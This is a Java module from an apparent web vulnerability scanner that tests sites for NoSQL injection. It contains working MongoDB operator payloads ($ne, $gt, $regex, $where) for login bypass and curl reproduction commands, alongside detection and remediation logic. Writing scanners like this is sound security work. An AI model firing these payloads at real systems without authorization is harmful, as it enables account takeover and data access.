package gg.effront.anarcry.scanner.web.nosqli;

import gg.effront.anarcry.model.CvssCalculator;
import gg.effront.anarcry.model.CweRegistry;
import gg.effront.anarcry.model.Finding;
import gg.effront.anarcry.model.Severity;
import gg.effront.anarcry.scanner.ScanContext;
import gg.effront.anarcry.scanner.Scanner;
import gg.effront.anarcry.scanner.util.CircuitBreakerException;
import gg.effront.anarcry.scanner.util.Http;
import gg.effront.anarcry.scanner.util.HttpClientFactory;
import gg.effront.anarcry.scanner.util.ProbeExecutor;

import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Callable;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.function.Consumer;
import java.util.regex.Pattern;

public class NoSqlInjectionModule implements Scanner {

    private static final List<String> PATHS = List.of("/login", "/api/login", "/api/auth", "/api/signin", "/api/users",
            "/api/search", "/search", "/api/", "/api/v1/", "/api/v1/users", "/api/v1/auth");

    private static final List<String> PARAMS = List.of("username", "password", "email", "user", "login", "query",
            "search", "filter", "id", "name");

    // -- Phase 1: Operator injection payloads for query parameters --
    private record OperatorPayload(String suffix, String description) {
    }

    private static final List<OperatorPayload> OPERATOR_PAYLOADS = List.of(
            new OperatorPayload("[$ne]=", "$ne operator -- not-equal bypass"),
            new OperatorPayload("[$gt]=", "$gt operator -- greater-than bypass"),
            new OperatorPayload("[$regex]=.*", "$regex operator -- match-all"),
            new OperatorPayload("[$exists]=true", "$exists operator -- field presence"),
            new OperatorPayload("[$where]=1", "$where operator -- JS evaluation"));

    // -- Phase 2: JSON body payloads for auth bypass --
    private record JsonPayload(String body, String description) {
    }

    private static final List<JsonPayload> JSON_PAYLOADS = List.of(
            new JsonPayload("{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}",
                    "$ne auth bypass -- password not-equal empty"),
            new JsonPayload("{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
                    "$gt auth bypass -- both fields greater-than empty"),
            new JsonPayload("{\"username\":\"admin\",\"password\":{\"$regex\":\".*\"}}",
                    "$regex auth bypass -- password regex match-all"),
            new JsonPayload("{\"$where\":\"this.password.match(/.*/)\"}", "$where JS evaluation"));

    // -- Error patterns for MongoDB, DynamoDB, and other NoSQL databases --
    private static final Pattern NOSQL_ERROR = Pattern.compile("MongoError|BSON|mongoose|CastError|ValidationError"
            + "|E11000 duplicate key|invalid operator|\\$where not allowed" + "|MongoServerError|BSONTypeError"
            + "|ValidationException|ConditionalCheckFailedException" + "|SerializationException"
            + "|MongoNetworkError|MongoParseError", Pattern.CASE_INSENSITIVE);

    // -- Indicators of successful auth bypass in responses --
    private static final Pattern AUTH_SUCCESS = Pattern.compile("\"token\"\\s*:|\"session\"\\s*:|\"access_token\"\\s*:"
            + "|\"jwt\"\\s*:|\"auth\"\\s*:\\s*true" + "|welcome|dashboard|logged.?in|authenticated",
            Pattern.CASE_INSENSITIVE);

    // -- Paths that look like login/auth endpoints --
    private static final Pattern LOGIN_PATH = Pattern.compile("login|auth|signin|sign-in|authenticate",
            Pattern.CASE_INSENSITIVE);

    @Override
    public String id() {
        return "NoSQLi";
    }

    @Override
    public List<Finding> scan(ScanContext ctx, Consumer<String> log) throws Exception {
        String cweId = CweRegistry.cweId(id());
        String cweTitle = CweRegistry.cweTitle(id());
        String cvssVec = CweRegistry.cvssVector(id());
        double cvssScore = CvssCalculator.calculate(cvssVec);

        List<Finding> findings = new ArrayList<>();
        HttpClient hc = HttpClientFactory.http2();

        String scheme = ctx.isHttps() ? "https" : "http";
        int defPort = ctx.isHttps() ? 443 : 80;
        String base = scheme + "://" + ctx.host() + (ctx.port() != defPort ? ":" + ctx.port() : "");

        // Merge static paths with crawler-discovered paths
        List<String> effectivePaths = new ArrayList<>(PATHS);
        for (String discovered : ctx.discoveredPaths().paths()) {
            if (!effectivePaths.contains(discovered)) {
                effectivePaths.add(discovered);
            }
        }

        // Merge static params with crawler-discovered params
        List<String> effectiveParams = new ArrayList<>(PARAMS);
        for (String discovered : ctx.discoveredPaths().parameters()) {
            if (!effectiveParams.contains(discovered)) {
                effectiveParams.add(discovered);
            }
        }

        log.accept("[~] NoSQLi: iniciando em " + base + " (" + effectivePaths.size() + " paths, "
                + effectiveParams.size() + " params, " + OPERATOR_PAYLOADS.size() + " operator payloads, "
                + JSON_PAYLOADS.size() + " JSON payloads)");

        AtomicBoolean cancel = new AtomicBoolean(false);
        List<Callable<List<Finding>>> tasks = new ArrayList<>();

        for (int pi = 0; pi < effectivePaths.size(); pi++) {
            final String path = effectivePaths.get(pi);
            final int pathIdx = pi;
            tasks.add(() -> {
                List<Finding> local = new ArrayList<>();
                boolean isLoginPath = LOGIN_PATH.matcher(path).find();

                log.accept("[~] NoSQLi: [" + (pathIdx + 1) + "/" + effectivePaths.size() + "] " + path + " -- "
                        + effectiveParams.size() + " params" + (isLoginPath ? " (login endpoint)" : ""));

                // -- Phase 1: Operator injection in query parameters --
                for (String param : effectiveParams) {
                    if (cancel.get()) {
                        return local;
                    }

                    String baselineBody = fetchBody(ctx, hc, base + path + "?" + param + "=test", log);
                    int baselineLen = baselineBody.length();

                    // Anti-FP: skip if baseline already contains NoSQL error tokens
                    if (NOSQL_ERROR.matcher(baselineBody).find()) {
                        log.accept(
                                "[~] NoSQLi: baseline ja contem erro NoSQL em " + path + " -- pulando param " + param);
                        continue;
                    }

                    for (OperatorPayload op : OPERATOR_PAYLOADS) {
                        if (cancel.get()) {
                            return local;
                        }

                        String encoded = URLEncoder.encode(param + op.suffix(), "UTF-8");
                        // Operator payloads use the param[$op]=value format
                        String url = base + path + "?" + param + URLEncoder.encode(op.suffix(), "UTF-8");
                        try {
                            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url))
                                    .timeout(Duration.ofSeconds(6)).GET().build();
                            HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(),
                                    id());
                            String body = resp.body() != null ? resp.body() : "";

                            // Check for NoSQL error disclosure
                            var errorMatch = NOSQL_ERROR.matcher(body);
                            if (errorMatch.find() && resp.statusCode() != 400) {
                                String match = errorMatch.group();
                                String endpoint = path + "?" + param + op.suffix();
                                log.accept("[!!] NoSQLi error-based em " + endpoint + " -- match: " + match);

                                local.add(Finding.of(id(), endpoint,
                                        "NoSQL Injection -- Error-Based (" + op.description() + ")", Severity.MEDIUM,
                                        "Payload: " + param + op.suffix() + " | Match: " + match + " | Status: "
                                                + resp.statusCode() + " | URL: " + url,
                                        "NoSQL error messages expoe detalhes " + "internos do banco de dados, "
                                                + "revelando tecnologia e " + "estrutura.",
                                        "curl -G '" + base + path + "' \\\n" + "  --data-urlencode '" + param
                                                + op.suffix() + "'",
                                        "Sanitize all input before passing " + "to NoSQL queries. Use ODM "
                                                + "methods that reject operator " + "objects. Disable verbose "
                                                + "error messages in production.",
                                        cweId, cweTitle, cvssVec, cvssScore));
                                cancel.set(true);
                                return local;
                            }

                            // Differential detection: response significantly
                            // different from baseline
                            int respLen = body.length();
                            boolean statusDiff = resp.statusCode() >= 200 && resp.statusCode() < 300 && baselineLen > 0;
                            boolean sizeDiff = baselineLen > 0 && Math.abs(respLen - baselineLen) > baselineLen * 0.3
                                    && Math.abs(respLen - baselineLen) > 50;

                            if (statusDiff && sizeDiff) {
                                String endpoint = path + "?" + param + op.suffix();
                                log.accept("[+] NoSQLi differential em " + endpoint + " baseline=" + baselineLen
                                        + " response=" + respLen);

                                Severity sev = isLoginPath ? Severity.HIGH : Severity.MEDIUM;
                                local.add(Finding.of(id(), endpoint,
                                        "NoSQL Injection -- Differential " + "Response (" + op.description() + ")", sev,
                                        "Payload: " + param + op.suffix() + " | Baseline length: " + baselineLen
                                                + " | Response length: " + respLen + " | Status: " + resp.statusCode(),
                                        "Operator injection altera a " + "resposta de forma "
                                                + "significativa, indicando " + "que o input e processado "
                                                + "como operador NoSQL.",
                                        "curl -G '" + base + path + "' \\\n" + "  --data-urlencode '" + param
                                                + op.suffix() + "'",
                                        "Validate and sanitize all input. " + "Reject objects when strings "
                                                + "are expected. Use " + "parameterized queries or " + "ODM methods.",
                                        cweId, cweTitle, cvssVec, cvssScore));
                            }
                        } catch (CircuitBreakerException cbe) {
                            throw cbe;
                        } catch (Exception ignored) {
                        }
                    }
                }

                // -- Phase 2: JSON body injection (login/auth endpoints) --
                if (isLoginPath) {
                    if (cancel.get()) {
                        return local;
                    }

                    // Baseline: normal JSON login attempt
                    String normalBody = "{\"username\":\"admin\",\"password\":\"invalidpassword123\"}";
                    String baselineResp = postJson(ctx, hc, base + path, normalBody, log);
                    int baselineJsonLen = baselineResp.length();
                    int baselineStatus = getStatusCode(ctx, hc, base + path, normalBody);

                    // Anti-FP: skip if baseline already contains NoSQL errors
                    if (NOSQL_ERROR.matcher(baselineResp).find()) {
                        log.accept("[~] NoSQLi: JSON baseline ja contem erro NoSQL em " + path + " -- pulando");
                    } else {
                        for (JsonPayload jp : JSON_PAYLOADS) {
                            if (cancel.get()) {
                                return local;
                            }

                            try {
                                HttpRequest req = HttpRequest.newBuilder().uri(URI.create(base + path))
                                        .timeout(Duration.ofSeconds(6)).header("Content-Type", "application/json")
                                        .POST(HttpRequest.BodyPublishers.ofString(jp.body())).build();
                                HttpResponse<String> resp = Http.send(ctx, hc, req,
                                        HttpResponse.BodyHandlers.ofString(), id());
                                String body = resp.body() != null ? resp.body() : "";

                                // Check for error disclosure
                                var errorMatch = NOSQL_ERROR.matcher(body);
                                if (errorMatch.find()) {
                                    String match = errorMatch.group();
                                    log.accept("[!!] NoSQLi JSON error-based em " + path + " -- match: " + match);

                                    local.add(Finding.of(id(), path,
                                            "NoSQL Injection -- JSON " + "Error-Based (" + jp.description() + ")",
                                            Severity.HIGH,
                                            "Payload: " + jp.body() + " | Match: " + match + " | Status: "
                                                    + resp.statusCode(),
                                            "JSON body com operadores NoSQL " + "provoca mensagem de "
                                                    + "erro interno, expondo " + "detalhes do banco.",
                                            "curl -s -X POST '" + base + path + "' \\\n" + "  -H 'Content-Type:"
                                                    + " application/json'" + " \\\n" + "  -d '" + jp.body() + "'",
                                            "Never pass raw user input to " + "NoSQL query operators."
                                                    + " Validate input types" + " -- reject objects "
                                                    + "when strings are " + "expected.",
                                            cweId, cweTitle, cvssVec, cvssScore));
                                    cancel.set(true);
                                    return local;
                                }

                                // Auth bypass detection: response suggests
                                // successful authentication
                                boolean successStatus = resp.statusCode() >= 200 && resp.statusCode() < 300;
                                boolean statusChanged = baselineStatus >= 400 && resp.statusCode() < 400;
                                boolean hasAuthToken = AUTH_SUCCESS.matcher(body).find();
                                boolean sizeDiff = baselineJsonLen > 0 && body.length() > baselineJsonLen * 1.3
                                        && body.length() - baselineJsonLen > 50;

                                if ((successStatus && hasAuthToken) || statusChanged) {
                                    log.accept(
                                            "[!!] NoSQLi auth bypass CRITICAL em " + path + " -- " + jp.description());

                                    local.add(Finding.of(id(), path,
                                            "NoSQL Injection -- "
                                                    + "Authentication " + "Bypass (" + jp.description() + ")",
                                            Severity.CRITICAL,
                                            "Payload: " + jp.body() + " | Status: " + resp.statusCode() + " (baseline: "
                                                    + baselineStatus + ")" + " | Auth token in" + " response: "
                                                    + hasAuthToken + " | Response" + " length: " + body.length()
                                                    + " (baseline: " + baselineJsonLen + ")",
                                            "Authentication bypass via " + "NoSQL operator " + "injection permite "
                                                    + "login sem credenciais" + " validas, " + "comprometendo "
                                                    + "qualquer conta.",
                                            "curl -s -X POST '" + base + path + "' \\\n" + "  -H 'Content-Type"
                                                    + ": application" + "/json' \\\n" + "  -d '" + jp.body() + "'",
                                            "Use parameterized queries or" + " ODM methods. Never"
                                                    + " pass raw input to " + "query operators. "
                                                    + "Validate input types" + " -- reject objects "
                                                    + "when strings are " + "expected. Disable " + "$where in MongoDB.",
                                            cweId, cweTitle, cvssVec, cvssScore));
                                    cancel.set(true);
                                    return local;
                                }

                                // Differential: response significantly
                                // different from baseline
                                if (sizeDiff && successStatus) {
                                    log.accept("[+] NoSQLi JSON differential em " + path + " baseline="
                                            + baselineJsonLen + " response=" + body.length());

                                    local.add(Finding.of(id(), path,
                                            "NoSQL Injection -- JSON "
                                                    + "Differential " + "Response (" + jp.description() + ")",
                                            Severity.HIGH,
                                            "Payload: " + jp.body() + " | Baseline " + "length: " + baselineJsonLen
                                                    + " | Response " + "length: " + body.length() + " | Status: "
                                                    + resp.statusCode(),
                                            "JSON body com operadores " + "NoSQL altera a " + "resposta de forma "
                                                    + "significativa, " + "indicando data " + "extraction.",
                                            "curl -s -X POST '" + base + path + "' \\\n" + "  -H 'Content-Type"
                                                    + ": application" + "/json' \\\n" + "  -d '" + jp.body() + "'",
                                            "Validate and sanitize all " + "JSON input. Reject" + " objects when "
                                                    + "strings are " + "expected. Use ODM" + " methods.",
                                            cweId, cweTitle, cvssVec, cvssScore));
                                }
                            } catch (CircuitBreakerException cbe) {
                                throw cbe;
                            } catch (Exception ignored) {
                            }
                        }
                    }
                }

                return local;
            });
        }

        findings.addAll(ProbeExecutor.run(tasks, ctx.config().probeConcurrency(), cancel));

        if (findings.isEmpty()) {
            log.accept("[+] NoSQLi: nenhuma injecao NoSQL detectada");
        }
        return findings;
    }

    // -- helpers --

    private String fetchBody(ScanContext ctx, HttpClient hc, String url, Consumer<String> log) {
        try {
            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(6)).GET()
                    .build();
            HttpResponse<String> r = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
            return r.body() != null ? r.body() : "";
        } catch (Exception e) {
            return "";
        }
    }

    private String postJson(ScanContext ctx, HttpClient hc, String url, String jsonBody, Consumer<String> log) {
        try {
            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(6))
                    .header("Content-Type", "application/json").POST(HttpRequest.BodyPublishers.ofString(jsonBody))
                    .build();
            HttpResponse<String> r = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
            return r.body() != null ? r.body() : "";
        } catch (Exception e) {
            return "";
        }
    }

    private int getStatusCode(ScanContext ctx, HttpClient hc, String url, String jsonBody) {
        try {
            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(6))
                    .header("Content-Type", "application/json").POST(HttpRequest.BodyPublishers.ofString(jsonBody))
                    .build();
            HttpResponse<String> r = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
            return r.statusCode();
        } catch (Exception e) {
            return -1;
        }
    }
}
